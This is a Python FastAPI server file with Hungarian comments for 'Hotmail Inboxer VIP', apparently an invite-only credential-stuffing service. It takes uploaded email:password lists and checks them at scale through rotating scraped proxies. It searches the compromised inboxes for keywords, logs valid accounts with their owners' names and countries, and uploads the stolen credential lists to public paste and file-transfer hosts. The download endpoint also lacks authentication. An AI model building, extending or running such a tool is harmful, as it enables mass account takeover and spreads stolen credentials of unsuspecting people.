from fastapi import FastAPI, UploadFile, Form, WebSocket, WebSocketDisconnect, Depends, HTTPException
from fastapi.responses import HTMLResponse, PlainTextResponse
from fastapi.templating import Jinja2Templates
from fastapi.staticfiles import StaticFiles
from starlette.requests import Request
from starlette.middleware.cors import CORSMiddleware
from contextlib import asynccontextmanager
import asyncio
import threading
import os
import json
import requests
import uuid
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- SAJÁT MODULOK IMPORTÁLÁSA ---
from database import (
    create_user, get_user_by_email, create_run, delete_old_runs,
    get_run, update_run_stats, update_run_status_only, add_result_to_run,
    add_result_details_to_run, get_user_finished_runs, finish_and_clean_run,
    get_active_run, create_invite_code, get_invite_code, mark_invite_used,
    revoke_invite_and_lock_user, get_all_invites, reactivate_user
)
from auth import create_access_token, decode_token, get_current_user, hash_password, verify_password
from checker import checker_worker_single
from proxy_manager import proxy_manager

# --- GLOBÁLIS VÁLTOZÓK ---
user_connections = {}
ws_lock = threading.Lock()
stop_flags = {}
stop_lock = threading.Lock()

MAX_WORKERS = 40
ADMIN_EMAIL = "xat.king6969@gmail.com"

# --- KÜLSŐ API FELTÖLTÉS ---
def upload_to_external_api(content: str, filename: str) -> str:
    """
    Eredmények feltöltése külső szolgáltatókhoz, 
    hogy a felhasználó akkor is letölthesse, ha a szerver korlátozott.
    """
    if not content or len(content.strip()) == 0:
        return None
    
    print(f"☁️ Feltöltés indítása: {filename}")
    
    # 1. Próba: Pastebin.fi
    try:
        res = requests.post("https://pastebin.fi/documents", data=content.encode('utf-8'), timeout=10)
        if res.status_code == 200:
            key = res.json().get("key")
            url = f"https://pastebin.fi/raw/{key}"
            print(f"✅ Feltöltve (Pastebin): {url}")
            return url
    except Exception as e:
        print(f"❌ Pastebin hiba: {e}")

    # 2. Próba: Transfer.sh
    try:
        res = requests.put(f"https://transfer.sh/{filename}", data=content.encode('utf-8'), timeout=15)
        if res.status_code == 200:
            url = res.text.strip()
            print(f"✅ Feltöltve (Transfer.sh): {url}")
            return url
    except Exception as e:
        print(f"❌ Transfer.sh hiba: {e}")
        
    return None

# --- SZERVER ÉLETTARTAM KEZELŐ (LIFESPAN) ---
@asynccontextmanager
async def lifespan(app: FastAPI):
    """
    Ez a rész fut le a szerver indulásakor. 
    A Render.com miatt a nehéz folyamatokat háttérbe tesszük.
    """
    print("\n" + "="*50)
    print("🚀 HOTMAIL INBOXER VIP - SZERVER INDÍTÁSA")
    print("="*50)

    # Proxy setup indítása háttérben (Render Port Fix)
    async def initial_proxy_setup():
        print("🔄 Proxyk letöltése és tesztelése folyamatban...")
        try:
            await asyncio.to_thread(proxy_manager.fetch_proxies)
            working_count = await asyncio.to_thread(
                proxy_manager.test_and_filter, 
                3000, # Max vizsgált proxy
                500,  # Szálak száma a teszthez
                8     # Timeout másodpercben
            )
            print(f"✅ Proxy setup kész! Működő proxyk száma: {working_count}")
        except Exception as e:
            print(f"⚠️ Kritikus hiba a proxy setup során: {e}")

    asyncio.create_task(initial_proxy_setup())

    # Automatikus frissítő ciklus (45 percenként új proxyk)
    async def proxy_refresh_loop():
        while True:
            await asyncio.sleep(2700)
            print("\n🔄 Időzített proxy frissítés...")
            await asyncio.to_thread(proxy_manager.fetch_and_test)

    refresh_task = asyncio.create_task(proxy_refresh_loop())

    # Adatbázis karbantartás: elárvult futások lezárása
    try:
        from pymongo import MongoClient
        sync_client = MongoClient(os.getenv("MONGODB_URL"))
        db = sync_client.hotmail_checker
        print("🧹 Adatbázis takarítása (beragadt futások lezárása)...")
        result = db.runs.update_many(
            {"status": "running"},
            {"$set": {"status": "finished", "finished_at": datetime.utcnow()}}
        )
        print(f"✅ {result.modified_count} futtatás sikeresen lezárva.")
        sync_client.close()
    except Exception as e:
        print(f"⚠️ Adatbázis takarítási hiba: {e}")

    yield

    print("\n" + "="*50)
    print("🛑 SZERVER LEÁLLÍTÁSA")
    print("="*50)
    refresh_task.cancel()
    
    # Minden futó checker leállítása
    with stop_lock:
        for user_id in list(stop_flags.keys()):
            print(f"👋 Checker leállítása: {user_id}")
            stop_flags[user_id].set()

# --- APP INICIALIZÁLÁSA ---
app = FastAPI(title="Hotmail Inboxer VIP", lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

templates = Jinja2Templates(directory="templates")
app.mount("/static", StaticFiles(directory="static"), name="static")

# --- WEBSOCKET BROADCAST ---
def broadcast_to_user(user_id: str, message: str):
    """Üzenet küldése a felhasználónak valós időben"""
    with ws_lock:
        if user_id not in user_connections:
            return
        dead = []
        for ws_info in user_connections[user_id]:
            try:
                asyncio.run_coroutine_threadsafe(
                    ws_info["ws"].send_text(message), 
                    ws_info["loop"]
                )
            except Exception:
                dead.append(ws_info)
        
        for d in dead:
            user_connections[user_id].remove(d)
        if not user_connections[user_id]:
            del user_connections[user_id]

# --- HTML OLDALAK ---

@app.get("/", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request})

@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request):
    return templates.TemplateResponse("register.html", {"request": request})

@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard_page(request: Request):
    return templates.TemplateResponse("dashboard.html", {"request": request})

@app.get("/admin", response_class=HTMLResponse)
async def admin_page(request: Request):
    return templates.TemplateResponse("admin.html", {"request": request})

# --- FELHASZNÁLÓI ÉS AUTH API ---

@app.post("/api/register")
async def register(email: str = Form(...), password: str = Form(...), invite_code: str = Form(...)):
    if len(password) < 6:
        raise HTTPException(status_code=400, detail="A jelszónak legalább 6 karakternek kell lennie!")
    
    # Meghívó ellenőrzése
    invite = await get_invite_code(invite_code)
    if not invite:
        raise HTTPException(status_code=400, detail="Ez a meghívó kód nem létezik!")
    
    if invite.get("is_used"):
        raise HTTPException(status_code=400, detail="Ezt a meghívó kódot már felhasználták!")

    if await get_user_by_email(email):
        raise HTTPException(status_code=400, detail="Ezzel az email címmel már regisztráltak!")
    
    # Felhasználó létrehozása
    await create_user(email, hash_password(password), invite_code)
    # Kód felhasználtra állítása (hogy az admin lássa ki használja)
    await mark_invite_used(invite_code, email)
    
    token = create_access_token({"sub": email})
    return {"token": token, "email": email}

@app.post("/api/login")
async def login(email: str = Form(...), password: str = Form(...)):
    user = await get_user_by_email(email)
    if not user or not verify_password(password, user["password"]):
        raise HTTPException(status_code=401, detail="Hibás email cím vagy jelszó!")
    
    token = create_access_token({"sub": email})
    return {"token": token, "email": email}

@app.get("/api/me")
async def get_me(current_user=Depends(get_current_user)):
    """Felhasználó adatainak és zárolási állapotának lekérése"""
    return {
        "email": current_user["email"],
        "needs_new_invite": current_user.get("needs_new_invite", False)
    }

@app.post("/api/reactivate")
async def reactivate_account(invite_code: str = Form(...), current_user=Depends(get_current_user)):
    """Zárolt fiók feloldása új érvényes kóddal"""
    invite = await get_invite_code(invite_code)
    if not invite or invite.get("is_used"):
        raise HTTPException(status_code=400, detail="Érvénytelen vagy már használt kód!")
    
    await reactivate_user(current_user["email"], invite_code)
    await mark_invite_used(invite_code, current_user["email"])
    return {"status": "success"}

# --- ADMIN API-K ---

@app.get("/api/admin/invites")
async def get_invites(current_user=Depends(get_current_user)):
    if current_user["email"] != ADMIN_EMAIL:
        raise HTTPException(status_code=403, detail="Nincs jogosultságod az admin funkciókhoz!")
    
    invites = await get_all_invites()
    for inv in invites:
        inv["_id"] = str(inv["_id"])
        inv["created_at"] = inv["created_at"].isoformat()
    return invites

@app.post("/api/admin/generate_invite")
async def generate_invite(current_user=Depends(get_current_user)):
    if current_user["email"] != ADMIN_EMAIL:
        raise HTTPException(status_code=403)
    
    # Egyedi kód generálása
    new_code = "INBOX-" + str(uuid.uuid4()).split('-')[0].upper()
    await create_invite_code(new_code)
    return {"status": "success", "code": new_code}

@app.delete("/api/admin/invites/{code}")
async def delete_invite(code: str, current_user=Depends(get_current_user)):
    if current_user["email"] != ADMIN_EMAIL:
        raise HTTPException(status_code=403)
    
    # Megvonjuk a kódot ÉS zároljuk a felhasználót
    await revoke_invite_and_lock_user(code)
    return {"status": "deleted"}

# --- CHECKER VEZÉRLÉS ---

@app.get("/api/proxy_status")
async def proxy_status(current_user=Depends(get_current_user)):
    stats = proxy_manager.get_stats()
    return {
        "proxy_count": stats["total"],
        "http": stats["http"],
        "socks4": stats["socks4"],
        "socks5": stats["socks5"],
        "tested": proxy_manager.is_tested(),
    }

@app.post("/api/refresh_proxies")
async def refresh_proxies(current_user=Depends(get_current_user)):
    count = await asyncio.to_thread(proxy_manager.fetch_and_test)
    return {"proxy_count": count}

@app.post("/api/start")
async def start_checker(
    file: UploadFile,
    keyword: str = Form(...),
    threads: int = Form(MAX_WORKERS),
    current_user=Depends(get_current_user),
):
    # Biztonsági ellenőrzés
    if current_user.get("needs_new_invite"):
        raise HTTPException(status_code=403, detail="A fiókod zárolva van! Kérj új kódot az admintól.")

    if await get_active_run(str(current_user["_id"])):
        raise HTTPException(status_code=400, detail="Már fut egy checker ezen a fiókon!")

    # Sorok feldolgozása
    content = await file.read()
    try:
        raw_lines = content.decode("utf-8", errors="ignore").splitlines()
    except Exception:
        raise HTTPException(status_code=400, detail="Hibás fájlformátum!")

    lines = [l.strip() for l in raw_lines if ':' in l and '@' in l]
    if not lines:
        raise HTTPException(status_code=400, detail="A fájl nem tartalmaz érvényes email:jelszó párosokat!")

    user_id = str(current_user["_id"])
    run_id = await create_run(user_id, keyword, len(lines))
    await delete_old_runs(user_id, run_id)

    # Stop flag inicializálása
    with stop_lock:
        stop_flags[user_id] = asyncio.Event()

    # Checker indítása külön szálon
    threading.Thread(
        target=lambda: asyncio.run(execute_checker(run_id, user_id, lines, keyword, threads)),
        daemon=True
    ).start()

    return {"run_id": run_id, "total": len(lines), "threads": threads}

@app.post("/api/stop")
async def stop_checker(current_user=Depends(get_current_user)):
    user_id = str(current_user["_id"])
    with stop_lock:
        if user_id in stop_flags:
            print(f"🛑 STOP parancs érkezett (User: {user_id})")
            stop_flags[user_id].set()
            return {"status": "stopping"}
    raise HTTPException(status_code=404, detail="Nincs futó checker.")

# --- A CHECKER MAGJA (EXECUTE) ---

async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, num_threads: int):
    checked = hits = custom = bad = retries = 0
    total = len(lines)
    main_loop = asyncio.get_event_loop()
    lock = threading.Lock()

    # Kezdő üzenet küldése
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "info", 
        "text": f"[RENDSZER] Indítás: {total} account | Szálak: {num_threads}"
    }))

    def check_single(line):
        nonlocal checked, hits, custom, bad, retries
        
        # 1. Beolvasás
        try:
            email, password = line.split(':', 1)
        except Exception:
            return

        # 2. Ellenőrzés a checker modul segítségével
        result = checker_worker_single(email, password, keyword)
        
        # 3. Statisztikák frissítése (Lock-al a biztonságért)
        with lock:
            checked += 1
            status = result["status"]
            
            if status == "hit":
                hits += 1
                d = result["data"]
                log_text = f"[HIT] {d['email']}:{d['password']} | Ország: {d['country']} | Név: {d['name']}"
                # Mentés adatbázisba
                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "hit", log_text), main_loop)
                asyncio.run_coroutine_threadsafe(add_result_details_to_run(run_id, "hit", d), main_loop)
                # Küldés WebSocketen
                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "hit", "text": log_text}))
                broadcast_to_user(user_id, json.dumps({"type": "live_hit", "data": d}))

            elif status == "custom":
                custom += 1
                log_text = f"[CUSTOM] {email}:{password} | LOGIN OK"
                asyncio.run_coroutine_threadsafe(add_result_to_run(run_id, "custom", log_text), main_loop)
                broadcast_to_user(user_id, json.dumps({"type": "log", "level": "custom", "text": log_text}))

            elif status == "bad":
                bad += 1
                if checked % 10 == 0: # Ne spammeljük a bad logokat
                    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "bad", "text": f"[BAD] {email}"}))
            
            else:
                retries += 1

            # Időszakos DB mentés és UI frissítés
            if checked % 10 == 0 or checked == total:
                asyncio.run_coroutine_threadsafe(
                    update_run_stats(run_id, {
                        "checked": checked, "hits": hits, "custom": custom, 
                        "bad": bad, "retries": retries
                    }), 
                    main_loop
                )
            
            broadcast_to_user(user_id, json.dumps({
                "type": "stats", "run_id": run_id, "checked": checked, "hits": hits, 
                "custom": custom, "bad": bad, "retries": retries, "total": total
            }))

    # BATCH FELDOLGOZÁS AZ AZONNALI STOP ÉRDEKÉBEN
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        batch_size = num_threads * 2
        for i in range(0, len(lines), batch_size):
            # STOP ELLENŐRZÉS MINDEN KIS CSOMAG ELŐTT
            with stop_lock:
                if user_id in stop_flags and stop_flags[user_id].is_set():
                    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": "🛑 Folyamat leállítva a felhasználó által."}))
                    break
            
            current_batch = lines[i : i + batch_size]
            futures = [executor.submit(check_single, line) for line in current_batch]
            # Megvárjuk amíg a jelenlegi kis csomag végez
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Hiba a szálon: {e}")

    # BEFEJEZÉS ÉS FELTÖLTÉS
    broadcast_to_user(user_id, json.dumps({"type": "log", "level": "info", "text": "⏳ Eredmények feldolgozása és feltöltése..."}))
    
    final_run = await get_run(run_id)
    hits_url = custom_url = None
    
    if final_run:
        hit_lines = final_run.get("hit_lines", [])
        custom_lines = final_run.get("custom_lines", [])
        
        if hit_lines:
            hits_url = await asyncio.to_thread(upload_to_external_api, "\n".join(hit_lines), f"Hits_{run_id}.txt")
        if custom_lines:
            custom_url = await asyncio.to_thread(upload_to_external_api, "\n".join(custom_lines), f"Custom_{run_id}.txt")
    
    await finish_and_clean_run(run_id, hits_url, custom_url)
    
    broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))
    broadcast_to_user(user_id, json.dumps({
        "type": "log", "level": "finish", 
        "text": f"🏁 KÉSZ! Hits: {hits} | Custom: {custom} | Bad: {bad}"
    }))
    
    # Stop flag törlése a végén
    with stop_lock:
        if user_id in stop_flags:
            del stop_flags[user_id]

# --- UTÓLAGOS ADATLEKÉRÉS ---

@app.get("/api/runs")
async def get_user_runs_list(current_user=Depends(get_current_user)):
    runs = await get_user_finished_runs(str(current_user["_id"]))
    for r in runs:
        r["_id"] = str(r["_id"])
        r["started_at"] = r["started_at"].isoformat()
        if r.get("finished_at"):
            r["finished_at"] = r["finished_at"].isoformat()
    return runs

@app.get("/api/get_download_url/{run_id}/{type}")
async def get_download_url(run_id: str, type: str, current_user=Depends(get_current_user)):
    run = await get_run(run_id)
    if not run or run["user_id"] != str(current_user["_id"]):
        raise HTTPException(status_code=404, detail="Futtatás nem található!")
    
    if type == "hits" and run.get("hits_url"):
        return {"url": run["hits_url"]}
    if type == "custom" and run.get("custom_url"):
        return {"url": run["custom_url"]}
        
    return {"url": f"/api/download_direct/{run_id}/{type}"}

@app.get("/api/download_direct/{run_id}/{type}")
async def download_direct(run_id: str, type: str):
    """Ha a külső feltöltés sikertelen, az adatbázisból szolgáljuk ki a fájlt"""
    run = await get_run(run_id)
    if not run:
        raise HTTPException(status_code=404)
    
    lines = run.get("hit_lines" if type == "hits" else "custom_lines", [])
    content = "\n".join(lines) if lines else "Nincs eredmény"
    
    return PlainTextResponse(
        content=content,
        headers={"Content-Disposition": f'attachment; filename="Hotmail-{type}.txt"'}
    )

# --- WEBSOCKET VÉGPONT ---

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket, token: str = ""):
    await websocket.accept()
    
    email = decode_token(token)
    if not email:
        return await websocket.close(code=1008)
        
    user = await get_user_by_email(email)
    if not user:
        return await websocket.close(code=1008)

    user_id = str(user["_id"])
    loop = asyncio.get_event_loop()
    ws_info = {"ws": websocket, "loop": loop}
    
    with ws_lock:
        if user_id not in user_connections:
            user_connections[user_id] = []
        user_connections[user_id].append(ws_info)

    print(f"🔌 WebSocket csatlakozva: {email}")

    try:
        # Aktív futás visszatöltése, ha van
        active_run = await get_active_run(user_id)
        if active_run:
            active_run["_id"] = str(active_run["_id"])
            await websocket.send_text(json.dumps({"type": "active_run", "run": active_run}))

        while True:
            data = await websocket.receive_text()
            if data == "ping":
                await websocket.send_text("pong")
    except (WebSocketDisconnect, Exception):
        print(f"🔌 WebSocket lecsatlakozva: {email}")
    finally:
        with ws_lock:
            if user_id in user_connections:
                if ws_info in user_connections[user_id]:
                    user_connections[user_id].remove(ws_info)

# --- INDÍTÁS ---
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    print("\n" + "="*50)
    print(f"🔥 HOTMAIL INBOXER VIP INDÍTÁSA A PORTON: {port}")
    print("="*50 + "\n")
    uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
